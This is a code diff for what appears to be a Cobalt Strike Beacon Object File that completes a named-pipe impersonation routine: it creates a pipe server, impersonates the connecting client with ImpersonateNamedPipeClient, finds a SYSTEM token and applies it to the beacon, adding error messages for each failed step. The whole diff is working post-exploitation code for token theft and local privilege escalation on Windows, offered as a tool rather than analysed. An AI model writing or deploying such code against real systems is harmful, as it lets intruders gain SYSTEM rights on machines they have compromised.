@@ -12,6 +12,7 @@
 
 typedef struct
 {
+	D_API( ImpersonateNamedPipeClient );
 	D_API( CreateNamedPipeA );
 	D_API( ConnectNamedPipe );
 	D_API( GetLastError );
@@ -36,9 +37,11 @@ void NetSvcGo( _In_ PCHAR Argv, _In_ INT Argc )
 	PCHAR	Srv = NULL;
 	PCHAR	Cli = NULL;
 
+	HANDLE	Adv = NULL;
 	HANDLE	K32 = NULL;
 	HANDLE	Fle = NULL;
 	HANDLE	Nps = NULL;
+	HANDLE	Imp = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
@@ -51,15 +54,17 @@ void NetSvcGo( _In_ PCHAR Argv, _In_ INT Argc )
 
 	/* Load kernel32.dll */
 	K32 = LoadLibraryA( "kernel32.dll" );
+	Adv = LoadLibraryA( "advapi32.dll" );
 
-	if ( K32 != NULL ) {
+	if ( K32 != NULL && Adv != NULL ) {
 
 		/* Locate the required API's */
-		Api.CreateNamedPipeA = C_PTR( GetProcAddress( K32, "CreateNamedPipeA" ) );
-		Api.ConnectNamedPipe = C_PTR( GetProcAddress( K32, "ConnectNamedPipe" ) );
-		Api.GetLastError     = C_PTR( GetProcAddress( K32, "GetLastError" ) );
-		Api.CreateFileA      = C_PTR( GetProcAddress( K32, "CreateFileA" ) );
-		Api.CloseHandle      = C_PTR( GetProcAddress( K32, "CloseHandle" ) );
+		Api.ImpersonateNamedPipeClient = C_PTR( GetProcAddress( Adv, "ImpersonateNamedPipeClient" ) );
+		Api.CreateNamedPipeA           = C_PTR( GetProcAddress( K32, "CreateNamedPipeA" ) );
+		Api.ConnectNamedPipe           = C_PTR( GetProcAddress( K32, "ConnectNamedPipe" ) );
+		Api.GetLastError               = C_PTR( GetProcAddress( K32, "GetLastError" ) );
+		Api.CreateFileA                = C_PTR( GetProcAddress( K32, "CreateFileA" ) );
+		Api.CloseHandle                = C_PTR( GetProcAddress( K32, "CloseHandle" ) );
 
 		/* Create a named pipe server */
 		if ( ( Nps = Api.CreateNamedPipeA(
@@ -85,13 +90,40 @@ void NetSvcGo( _In_ PCHAR Argv, _In_ INT Argc )
 				/* Attempt to test if we have been connected yet! */
 				if ( ! Api.ConnectNamedPipe( Nps, NULL ) && Api.GetLastError() == ERROR_PIPE_CONNECTED ) 
 				{
-					/* Success: Start working on impersonation & token theft */
+					/* Impersonate the client */
+					if ( Api.ImpersonateNamedPipeClient( Nps ) ) {
+						/* Locate a SYSTEM token */
+						if ( ( Imp = TokenFindSystemToken() ) != NULL ) 
+						{
+							/* Impersonate & close handle */
+							BeaconUseToken( Imp ); Api.CloseHandle( Imp );
+						} else
+						{
+							BeaconPrintf( CALLBACK_ERROR, "could not find a system token." );
+						};
+					} else 
+					{
+						BeaconPrintf( CALLBACK_ERROR, "could not impersonate the client." );
+					};
+				} else
+				{
+					BeaconPrintf( CALLBACK_ERROR, "could not establish a connection to the client." );
 				};
 				Api.CloseHandle( Fle );
+			} else
+			{
+				BeaconPrintf( CALLBACK_ERROR, "could not create a client pipe." );
 			};
 			Api.CloseHandle( Nps );
+		} else
+		{
+			BeaconPrintf( CALLBACK_ERROR, "could not create a server pipe." );
 		};
-		/* Free dependency */
+	};
+	if ( Adv != NULL ) {
+		FreeLibrary( Adv );
+	};
+	if ( K32 != NULL ) {
 		FreeLibrary( K32 );
 	};
 
